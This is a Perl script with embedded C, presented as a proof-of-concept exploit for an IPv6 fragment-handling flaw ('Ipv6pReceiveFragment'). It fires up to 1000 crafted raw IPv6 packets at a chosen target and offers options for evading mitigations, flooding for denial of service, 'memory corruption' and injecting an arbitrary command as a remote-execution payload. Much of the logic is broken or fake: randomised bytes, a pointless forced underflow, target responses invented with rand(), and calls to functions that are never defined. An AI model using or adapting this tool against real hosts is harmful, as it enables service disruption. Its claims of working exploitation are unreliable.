use strict;
use warnings;
use Getopt::Long;
use Term::ANSIColor;
use Net::Frame::Layer::IPv6;
use Net::Frame::Layer::ICMPv6;
use Net::Frame::Simple;
use Net::Pcap;
use threads;
use POSIX qw(strftime);
use Net::IP;
use Net::Ping;
use Inline C => <<'END_C';

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/socket.h>

#define MAX_PACKET_SIZE 1500

// Function to create a payload for exploiting Ipv6pReceiveFragment vulnerability
void create_ipv6_fragment_payload(char *payload, size_t length, unsigned short header_length, int attempt, int autoevade, int target_response, int autorce, char *autorce_payload) {
    srand(time(NULL) + attempt);

    // Introduce variability and potential bad inputs based on target response
    for (size_t i = 0; i < length; i++) {
        payload[i] = (char)(rand() % 256);  // Random bytes throughout
    }

    // Specific exploit manipulation
    unsigned short exploit_value = (unsigned short)((header_length + length) % 65536);
    payload[header_length] = (char)(exploit_value & 0xFF); 
    payload[header_length + 1] = 0x00; // Null byte for termination
    payload[header_length + 2] = (char)(0xFF - exploit_value); // Trigger point

    if (autoevade) {
        // Apply adaptive changes based on the target's response
        for (size_t i = header_length + 3; i < header_length + 20; i++) {
            payload[i] = (target_response % 2 == 0) ? rand() % 256 : (char)(~payload[i]);
        }

        // Adjust header values to attempt evasion techniques
        payload[header_length + 4] = (attempt % 2 == 0) ? 0x3B : 0x06; // Alternate between No Next Header and TCP
    }

    // Guaranteed Integer Underflow - this will force an underflow
    unsigned short underflow_test = header_length;
    underflow_test -= 65535; // This will definitely cause underflow
    payload[header_length + 5] = (char)(underflow_test & 0xFF); // Use the underflowed value in the payload

    // Use the underflowed value in multiple strategic places
    payload[header_length + 10] = (char)(underflow_test >> 8);
    payload[header_length + 15] = (char)((underflow_test & 0xFF) ^ 0xAA); // XOR with 0xAA for added effect

    if (autorce && autorce_payload != NULL) {
        // Inject the autorce payload (e.g., "whoami") at a strategic location in the packet
        size_t payload_len = strlen(autorce_payload);
        if (header_length + payload_len < length) {
            memcpy(payload + header_length + 20, autorce_payload, payload_len);
            printf("[+] Autorce payload '%s' injected into packet.\n", autorce_payload);
        } else {
            printf("[!] Autorce payload is too large to fit into the packet at the desired location.\n");
        }
    }

    printf("[+] Payload crafted for attempt %d with exploit value: 0x%02x, auto-evade: %s, autorce: %s\n", attempt, exploit_value, autoevade ? "Enabled" : "Disabled", autorce ? "Enabled" : "Disabled");
}

// Function to send the crafted packet to the target
void send_packet(char *target_ip, char *buffer, size_t total_size, int delay) {
    if (total_size > MAX_PACKET_SIZE) {
        printf("[!] Packet size %zu exceeds the maximum allowable size of %d bytes.\n", total_size, MAX_PACKET_SIZE);
        free(buffer);
        return;
    }

    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("[!] \033[1;31mSocket creation failed\033[0m");
        free(buffer);
        return;
    }

    printf("[+] \033[1;32mRaw socket created successfully.\033[0m\n");

    struct sockaddr_in6 dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin6_family = AF_INET6;
    inet_pton(AF_INET6, target_ip, &dest.sin6_addr);

    usleep(delay); // Adjust delay based on strategy

    if (sendto(sock, buffer, total_size, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
        perror("[!] \033[1;31mSendto failed\033[0m");
    } else {
        printf("[>] Packet sent to %s with size: %zu bytes.\n", target_ip, total_size);
        printf("[>] Buffer content (first 32 bytes): %.32s\n", buffer);
    }

    close(sock);
    free(buffer);
}

// Function to dynamically exploit the Ipv6pReceiveFragment vulnerability
void dynamic_exploit_ipv6(char *target_ip, unsigned short header_length, int max_attempts, int autoevade, int autorce, char *autorce_payload) {
    printf("[+] \033[1;32mStarting dynamic exploitation on %s with header length %d...\033[0m\n", target_ip, header_length);

    int target_response = 0;

    for (int attempt = 1; attempt <= max_attempts; attempt++) {
        time_t now = time(NULL);
        char *timestamp = ctime(&now);
        timestamp[strlen(timestamp) - 1] = '\0';

        printf("\n[=] \033[1;34mAttempt %d/%d [%s]...\033[0m\n", attempt, max_attempts, timestamp);

        size_t total_size = (1500 - header_length) - (attempt % 100); // Vary size within the MTU
        if (total_size > MAX_PACKET_SIZE) {
            printf("[!] Calculated packet size %zu exceeds maximum allowable size.\n", total_size);
            total_size = MAX_PACKET_SIZE - 1; // Adjust to max allowable size
        }

        printf("[>] Calculated packet size: \033[1;36m%zu bytes\033[0m\n", total_size);

        char *buffer = (char *)malloc(total_size);
        if (buffer) {
            printf("[+] \033[1;32mMemory allocation successful\033[0m for attempt %d, buffer size: %zu bytes.\n", attempt, total_size);

            create_ipv6_fragment_payload(buffer, total_size, header_length, attempt, autoevade, target_response, autorce, autorce_payload);
            printf("[?] \033[1;36mPayload crafted successfully\033[0m for attempt %d with targeted manipulations.\n", attempt);

            send_packet(target_ip, buffer, total_size, 5000); // Adding delay to adjust attack strategy

            // Simulate target response analysis
            target_response = rand() % 100;
            printf("[?] \033[1;36mAnalyzed target response\033[0m for attempt %d, response value: %d.\n", attempt, target_response);

            printf("[?] \033[1;36mResources cleaned up\033[0m for attempt %d.\n", attempt);
        } else {
            printf("[!] \033[1;31mMemory allocation failed\033[0m on attempt %d; possible mitigation detected.\n", attempt);
            break;
        }
    }

}

END_C

# CLI options
my ($target, $header_length, $exploit, $attempts, $help, $autoevade, $flood, $duration, $autodos, $memcorrupt, $autorce, $autorce_payload, $no_ipv6_verify, $interface, $autointerface);

GetOptions(
    'target=s'          => \$target,
    'header_length=i'   => \$header_length,
    'exploit'           => \$exploit,
    'attempts=i'        => \$attempts,
    'autoevade'         => \$autoevade,
    'flood'             => \$flood,
    'duration=i'        => \$duration,
    'autodos'           => \$autodos,
    'memcorrupt'        => \$memcorrupt,
    'autorce'           => \$autorce,
    'payload=s'         => \$autorce_payload,
    'no-ipv6-verify'    => \$no_ipv6_verify,
    'interface=s'       => \$interface,
    'autointerface'     => \$autointerface,
    'help'              => \$help,
) or die("[!] Error in command line arguments\n");

# IPv6 validation function using Net::IP
sub is_valid_ipv6 {
    my ($ipv6) = @_;
    my $ip = Net::IP->new($ipv6);
    return ($ip && $ip->version() == 6);
}

# IPv6 reachability check function, with support for link-local addresses
sub is_ipv6_reachable {
    my ($ipv6, $interface) = @_;
    my $p = Net::Ping->new("tcp", 1);
    $p->port_number(80);

    # Bind to the specified interface if provided
    if ($interface) {
        $p->bind($interface);
        print "[+] Checking reachability on interface $interface...\n";
    }

    return $p->ping($ipv6);
}

# Validate IPv6 target before proceeding
if ($target && !$no_ipv6_verify) {
    if (!is_valid_ipv6($target)) {
        die "[!] \033[1;31mError: Invalid IPv6 address provided.\033[0m\n";
    }

    # Automatically determine the interface if --autointerface is set
    if ($autointerface && !$interface && $target =~ /^fe80::/i) {
        $interface = `ip -6 addr | grep -B2 '$target' | grep -oP '(?<=inet6 ).*(?=/)' | head -n1`;
        $interface = `ip -6 addr | grep -B2 '$target' | head -n1 | awk '{print \$2}' | sed 's/://g'`;
        chomp $interface;
        if ($interface) {
            print "[+] Auto-detected interface: $interface\n";
        } else {
            die "[!] \033[1;31mError: Could not automatically detect interface for link-local address.\033[0m\n";
        }
    }

    if (!is_ipv6_reachable($target, $interface)) {
        die "[!] \033[1;31mError: IPv6 address is not reachable or IPv6 is not active on the target.\033[0m\n";
    }
}

if ($help || !$target || (!$exploit && !$flood && !$autodos && !$memcorrupt && !$autorce)) {
    print "\n[!] \033[1;33mUsage: $0 --target <target_ip> [--header_length <length>] --exploit [--attempts <number>] [--autoevade] --flood [--duration <seconds>] --autodos --memcorrupt --autorce --payload <command> [--no-ipv6-verify] [--interface <interface>] [--autointerface]\033[0m\n";
    exit;
}

if ($exploit) {
    if (!$header_length) {
        die("[!] \033[1;31mError: --header_length is required for exploitation phase.\033[0m\n");
    }

    $attempts ||= 1000;  # Increase the number of attempts significantly

    print "\n\033[1;31m[=] Dynamic PoC by Haroon Ahmad Awan [=]\033[0m\n";
    print "[+] \033[1;32mLaunching dynamic exploitation with $attempts attempt(s) on target $target.\033[0m\n";
    if ($autoevade) {
        print "[+] \033[1;32mAuto-evade enabled: Applying mitigation defeat techniques.\033[0m\n";
    }
    if ($autorce && !$autorce_payload) {
        die("[!] \033[1;31mError: --payload is required when using --autorce.\033[0m\n");
    }
    threads->create(\&dynamic_exploit_ipv6, $target, $header_length, $attempts, $autoevade, $autorce, $autorce_payload)->join();
    print "\n[+] \033[1;32mDynamic exploitation completed.\033[0m\n";
}

if ($flood || $autodos) {
    $duration ||= 60;  # Default duration is 60 seconds
    print "\n[+] \033[1;31mInitiating Flooding Mode for $duration seconds.\033[0m\n";
    threads->create(\&flood_target, $target, $duration)->join();
    print "\n[+] \033[1;32mFlooding Mode completed.\033[0m\n";
}

if ($memcorrupt) {
    $attempts ||= 500;  # Set a default number of attempts for memory corruption

    print "\n[+] \033[1;31mTriggering memory corruption simulation on target $target.\033[0m\n";
    threads->create(\&trigger_memory_corruption, $target, $attempts)->join();
    print "\n[+] \033[1;32mMemory corruption simulation completed.\033[0m\n";
}
